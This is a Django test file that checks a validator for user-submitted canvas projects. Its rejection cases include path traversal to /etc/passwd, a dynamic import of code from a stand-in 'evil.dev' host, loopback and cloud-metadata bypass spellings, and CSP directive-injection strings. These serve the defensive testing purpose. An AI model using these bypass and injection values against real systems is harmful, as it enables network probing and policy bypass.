from typing import Any

from django.test import SimpleTestCase

from parameterized import parameterized

from products.canvas.backend.contract import contract_limits
from products.canvas.backend.source import (
    CANVAS_COMPONENT_PATH,
    CANVAS_ENTRY_HTML,
    MAX_CONFIG_SCHEMA_DEPTH,
    has_errors,
    synthetic_source_project,
    validate_source_project,
)

MAX_FILE_BYTES = contract_limits()["maxSourceFileBytes"]
MAX_SOURCE_FILES = contract_limits()["maxSourceFiles"]

CODE = 'import React from "react";\nexport default () => <div>hi</div>;\n'


def project(**overrides):
    base = {
        "schemaVersion": 1,
        "files": {CANVAS_ENTRY_HTML: '<div id="root"></div>', CANVAS_COMPONENT_PATH: CODE},
        "entryHtml": CANVAS_ENTRY_HTML,
        "dependencies": {"react": "19.0.0"},
        "canvasSdkVersion": "0.1.0",
    }
    if "files" in overrides:
        overrides["files"] = {CANVAS_ENTRY_HTML: '<div id="root"></div>', **overrides["files"]}
    base.update(overrides)
    return base


class TestCanvasSourceAdapter(SimpleTestCase):
    def test_synthetic_project_of_legacy_canvas_validates_and_round_trips(self):
        # The read → edit → publish loop must accept its own output: a project
        # synthesized from a legacy canvas has to pass validation and reduce back
        # to the identical code.
        synthetic = synthetic_source_project(CODE)
        self.assertEqual(synthetic["files"][CANVAS_COMPONENT_PATH], CODE)
        self.assertFalse(has_errors(validate_source_project(synthetic)))

    def test_synthetic_project_of_unpublished_canvas_has_empty_component(self):
        synthetic = synthetic_source_project(None)
        self.assertEqual(synthetic["files"][CANVAS_COMPONENT_PATH], "")
        self.assertFalse(has_errors(validate_source_project(synthetic)))

    def test_valid_minimal_project_has_no_diagnostics(self):
        self.assertEqual(validate_source_project(project()), [])

    @parameterized.expand(
        [
            ("wrong_schema_version", project(schemaVersion=2), "unsupported_schema_version"),
            ("wrong_entry_html", project(entryHtml="main.html"), "invalid_entry"),
            (
                "path_traversal",
                project(files={CANVAS_COMPONENT_PATH: CODE, "../escape.tsx": "x"}),
                "invalid_path",
            ),
            (
                "absolute_path",
                project(files={CANVAS_COMPONENT_PATH: CODE, "/etc/passwd": "x"}),
                "invalid_path",
            ),
            (
                "backslash_path",
                project(files={CANVAS_COMPONENT_PATH: CODE, "src\\win.tsx": "x"}),
                "invalid_path",
            ),
            ("unknown_dependency", project(dependencies={"left-pad": "1.0.0"}), "dependency_not_admitted"),
            (
                "dependency_version_drift",
                project(dependencies={"react": "18.0.0"}),
                "dependency_version_mismatch",
            ),
            (
                "non_whitelisted_import",
                project(files={CANVAS_COMPONENT_PATH: 'import _ from "lodash";\n' + CODE}),
                "import_not_allowed",
            ),
            (
                "undeclared_state_access",
                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'}),
                "capability_missing_state",
            ),
            (
                # get/set default to the user scope, so declaring only shared
                # does not cover a scopeless call.
                "state_default_user_scope_undeclared",
                project(
                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'},
                    capabilities={"posthog": {"state": ["shared"]}, "network": {"origins": []}},
                ),
                "capability_missing_state",
            ),
            (
                "state_scope_literal_undeclared",
                project(
                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.get("k", { scope: "shared" });'},
                    capabilities={"posthog": {"state": ["user"]}, "network": {"origins": []}},
                ),
                "capability_missing_state",
            ),
            (
                "undeclared_action_invoke",
                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.actions.invoke("tasks.create", {});'}),
                "capability_missing_action",
            ),
            (
                "unregistered_declared_action",
                project(capabilities={"posthog": {"actions": ["flags.delete"]}, "network": {"origins": []}}),
                "action_not_registered",
            ),
            (
                "dynamic_import",
                project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                "forbidden_dynamic_import",
            ),
            (
                "require_call",
                project(files={CANVAS_COMPONENT_PATH: 'const fs = require("fs");'}),
                "forbidden_require",
            ),
            (
                "inline_script_tag",
                project(files={CANVAS_COMPONENT_PATH: 'const html = "<script src=x></script>";'}),
                "forbidden_inline_script",
            ),
            (
                "file_too_large",
                project(files={CANVAS_COMPONENT_PATH: "a" * (MAX_FILE_BYTES + 1)}),
                "file_too_large",
            ),
            (
                "too_many_files",
                project(
                    files={
                        CANVAS_COMPONENT_PATH: CODE,
                        **{f"src/f{i}.ts": "x" for i in range(MAX_SOURCE_FILES)},
                    }
                ),
                "too_many_files",
            ),
            (
                "too_many_assets",
                project(
                    assets={
                        f"assets/{i}.png": {
                            "encoding": "base64",
                            "contentType": "image/png",
                            "content": "",
                        }
                        for i in range(MAX_SOURCE_FILES)
                    }
                ),
                "too_many_files",
            ),
        ]
    )
    def test_invalid_projects_produce_error_diagnostics(self, _name, candidate, expected_code):
        diagnostics = validate_source_project(candidate)
        self.assertTrue(has_errors(diagnostics), diagnostics)
        self.assertIn(expected_code, [d["code"] for d in diagnostics])

    @parameterized.expand(
        [
            # A scopeless get/set defaults to the user scope.
            ("default_user_scope", 'ph.state.set("k", 1);', ["user"]),
            ("explicit_scope_literal", 'ph.state.get("k", { scope: "shared" });', ["shared"]),
            # A scopeless list reads whatever is declared, so any declaration covers it.
            ("scopeless_list", "ph.state.list();", ["shared"]),
        ]
    )
    def test_declared_state_scopes_silence_the_state_diagnostic(self, _name, snippet, scopes):
        candidate = project(
            files={CANVAS_COMPONENT_PATH: CODE + snippet},
            capabilities={
                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": [], "state": scopes},
                "network": {"origins": []},
            },
        )
        diagnostics = validate_source_project(candidate)
        self.assertNotIn("capability_missing_state", [d["code"] for d in diagnostics])

    def test_direct_network_calls_warn_but_stay_publishable(self):
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + "fetch(dynamicUrl);"})
        diagnostics = validate_source_project(candidate)
        self.assertFalse(has_errors(diagnostics))
        self.assertIn("network_fetch", [d["code"] for d in diagnostics])

    @parameterized.expand(
        [
            ("fetch", 'fetch("https://api.example.com/v1/data");', CANVAS_COMPONENT_PATH, "https://api.example.com"),
            (
                "fetch_template_literal",
                "fetch(`https://api.example.com/v1/${reportId}`);",
                CANVAS_COMPONENT_PATH,
                "https://api.example.com",
            ),
            (
                "image",
                '<img src="https://images.example.com/chart.png" />',
                CANVAS_COMPONENT_PATH,
                "https://images.example.com",
            ),
            (
                "image_srcset",
                '<img srcSet="/chart-small.png 1x, https://images.example.com/chart-large.png 2x" />',
                CANVAS_COMPONENT_PATH,
                "https://images.example.com",
            ),
            (
                "stylesheet",
                '<link rel="stylesheet" href="https://styles.example.com/theme.css" />',
                CANVAS_ENTRY_HTML,
                "https://styles.example.com",
            ),
            (
                "css_url",
                '.hero { background-image: url("https://images.example.com/hero.png"); }',
                "src/theme.css",
                "https://images.example.com",
            ),
            (
                "css_import",
                '@import url("https://styles.example.com/base.css");',
                "src/theme.css",
                "https://styles.example.com",
            ),
        ]
    )
    def test_literal_external_resources_require_declared_origin(self, _name, snippet, path, expected_origin):
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE, path: snippet})

        diagnostics = validate_source_project(candidate)

        entry = next(d for d in diagnostics if d["code"] == "capability_missing_network_origin")
        self.assertIn(f'"{expected_origin}" in capabilities.network.origins', entry["message"])
        self.assertEqual(entry["path"], path)

    def test_declared_origin_covers_literal_external_resources(self):
        candidate = project(
            files={CANVAS_COMPONENT_PATH: CODE + 'fetch("https://api.example.com/v1/data");'},
            capabilities={"network": {"origins": ["https://api.example.com"]}},
        )

        diagnostics = validate_source_project(candidate)

        self.assertNotIn("capability_missing_network_origin", [entry["code"] for entry in diagnostics])

    @parameterized.expand(
        [
            ("anchor", '<a href="https://posthog.com/docs">Docs</a>'),
            ("open_external", 'ph.openExternal("https://app.posthog.com/insights/abc");'),
        ]
    )
    def test_navigation_urls_do_not_require_network_origin(self, _name, snippet):
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + snippet})

        diagnostics = validate_source_project(candidate)

        self.assertNotIn("capability_missing_network_origin", [entry["code"] for entry in diagnostics])

    @parameterized.expand(
        [
            ("object", '<object data="https://cdn.example.com/report.pdf"></object>'),
            ("embed", '<embed src="https://cdn.example.com/report.pdf" />'),
        ]
    )
    def test_object_and_embed_do_not_require_network_origin(self, _name, snippet):
        # The artifact CSP keeps object-src 'none', so a declared origin cannot
        # make these load. Flagging them would block publish with a remedy that
        # does nothing.
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + snippet})

        diagnostics = validate_source_project(candidate)

        self.assertNotIn("capability_missing_network_origin", [entry["code"] for entry in diagnostics])

    @parameterized.expand(
        [
            ("http", "http://api.example.com"),
            ("path", "https://api.example.com/v1"),
            ("credentials", "https://user:secret@api.example.com"),
            ("wildcard", "https://*.example.com"),
            # Origins land in the viewer's CSP, so private and local
            # destinations would let a canvas probe the viewer's machine or LAN.
            ("loopback_ipv4", "https://127.0.0.1:8443"),
            ("private_ipv4", "https://192.168.1.1"),
            ("cgnat_ipv4", "https://100.64.0.1"),
            ("loopback_ipv6", "https://[::1]"),
            ("localhost", "https://localhost:8010"),
            ("single_label", "https://intranet"),
            ("mdns_suffix", "https://printer.local"),
            # Bypass spellings from the security review: browsers resolve these
            # to loopback/LAN targets even though the strict IP parse rejects them.
            ("trailing_dot_localhost", "https://localhost."),
            ("trailing_dot_metadata", "https://169.254.169.254."),
            ("trailing_dot_public", "https://api.example.com."),
            ("ipv4_shorthand", "https://127.1"),
            ("ipv4_octal", "https://0177.0.0.1"),
            ("ipv4_leading_zero", "https://192.168.01.1"),
            ("ipv4_hex_label", "https://1.2.3.0x10"),
            ("ipv6_scope_id", "https://[fe80::1%eth0]"),
            ("ipv6_global_scope_id", "https://[2606:4700:4700::1111%foo; img-src evil.example]"),
            # A delimiter in the hostname would break out of the directive it is
            # spliced into. This form carries no wildcard, so only the hostname
            # charset check rejects it.
            ("csp_directive_injection", "https://example.com; img-src evil.example.net"),
        ]
    )
    def test_rejects_network_origins_that_are_not_exact_https_origins(self, _name, origin):
        candidate = project(
            capabilities={
                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": []},
                "network": {"origins": [origin]},
            }
        )
        diagnostics = validate_source_project(candidate)
        self.assertIn("invalid_network_origin", [d["code"] for d in diagnostics])

    def test_accepts_exact_https_network_origin(self):
        candidate = project(
            capabilities={
                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": []},
                "network": {"origins": ["https://api.example.com:8443"]},
            }
        )
        self.assertFalse(has_errors(validate_source_project(candidate)))

    def test_import_diagnostics_carry_file_and_line(self):
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + 'import _ from "lodash";'})
        entry = next(d for d in validate_source_project(candidate) if d["code"] == "import_not_allowed")
        self.assertEqual(entry["path"], CANVAS_COMPONENT_PATH)
        self.assertEqual(entry["line"], 3)

    def test_agent_request_requires_declared_capability(self):
        candidate = project(
            files={CANVAS_COMPONENT_PATH: CODE + 'ph.agent.request("Make it blue");'},
            capabilities={
                "posthog": {
                    "insights": [],
                    "inlineQueries": False,
                    "captureEvents": [],
                    "agentRequests": False,
                },
                "network": {"origins": []},
            },
        )

        diagnostics = validate_source_project(candidate)

        self.assertIn("capability_missing_agent_requests", [entry["code"] for entry in diagnostics])


def component_meta(**overrides):
    meta = {
        "size": {"defaultW": 2, "defaultH": 1, "minW": 1, "minH": 1},
        "configSchema": {"type": "object", "properties": {"location": {"type": "string"}}},
    }
    meta.update(overrides)
    return meta


def deeply_nested_config_schema(levels):
    schema: dict[str, Any] = {"type": "object"}
    for _ in range(levels):
        schema = {"type": "object", "items": schema}
    return schema


class TestComponentMetaValidation(SimpleTestCase):
    def test_valid_component_project_has_no_errors(self):
        candidate = project(component=component_meta())
        self.assertFalse(has_errors(validate_source_project(candidate, kind="component")))

    def test_component_meta_is_rejected_outside_component_kind(self):
        diagnostics = validate_source_project(project(component=component_meta()))
        self.assertIn("component_meta_not_allowed", [entry["code"] for entry in diagnostics])

    @parameterized.expand(
        [
            ("missing_meta", None, "component_meta_missing"),
            ("meta_not_object", "big", "component_meta_missing"),
            ("missing_size", {"configSchema": {"type": "object"}}, "component_size_invalid"),
            (
                "size_not_ints",
                component_meta(size={"defaultW": "2", "defaultH": 1, "minW": 1, "minH": 1}),
                "component_size_invalid",
            ),
            (
                "min_above_default",
                component_meta(size={"defaultW": 1, "defaultH": 1, "minW": 2, "minH": 1}),
                "component_size_invalid",
            ),
            (
                "default_above_max",
                component_meta(size={"defaultW": 4, "defaultH": 1, "minW": 1, "minH": 1, "maxW": 3}),
                "component_size_invalid",
            ),
            (
                "width_above_grid_cap",
                component_meta(size={"defaultW": 13, "defaultH": 1, "minW": 1, "minH": 1}),
                "component_size_invalid",
            ),
            (
                "zero_height",
                component_meta(size={"defaultW": 1, "defaultH": 0, "minW": 1, "minH": 0}),
                "component_size_invalid",
            ),
            (
                "config_schema_not_object_type",
                component_meta(configSchema={"type": "array"}),
                "component_config_schema_invalid",
            ),
            (
                "config_schema_malformed",
                component_meta(configSchema={"type": "object", "properties": 5}),
                "component_config_schema_invalid",
            ),
            (
                "config_schema_ref_not_allowlisted",
                component_meta(configSchema={"type": "object", "properties": {"a": {"$ref": "#/defs/a"}}}),
                "component_config_schema_invalid",
            ),
            (
                "config_schema_pattern_not_allowlisted",
                component_meta(
                    configSchema={"type": "object", "properties": {"a": {"type": "string", "pattern": "^a"}}}
                ),
                "component_config_schema_invalid",
            ),
            (
                "config_schema_too_deeply_nested",
                component_meta(configSchema=deeply_nested_config_schema(MAX_CONFIG_SCHEMA_DEPTH + 200)),
                "component_config_schema_invalid",
            ),
        ]
    )
    def test_invalid_component_meta_produces_error(self, _name, meta, expected_code):
        candidate = project() if meta is None else project(component=meta)
        diagnostics = validate_source_project(candidate, kind="component")
        self.assertIn(expected_code, [entry["code"] for entry in diagnostics])
